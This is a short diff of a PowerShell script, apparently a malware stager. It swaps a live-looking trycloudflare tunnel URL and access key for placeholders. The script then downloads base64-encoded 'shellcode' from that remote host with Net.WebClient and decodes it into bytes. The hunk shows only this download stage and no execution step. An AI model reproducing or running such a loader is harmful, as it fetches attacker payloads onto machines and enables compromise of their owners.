@@ -1,4 +1,4 @@
-$u="https://mandatory-zip-installing-illinois.trycloudflare.com/payloads/shellcode.txt?key=57c36cda7fe1823797273b065ea3b8f8"
+$u="https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN"
 [Net.ServicePointManager]::SecurityProtocol="Tls12"
 Write-Host "[*] Downloading shellcode..."
 try{$sc=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u));Write-Host "[+] Got $($sc.Length) bytes"}catch{Write-Host "[-] Download failed: $_";return}
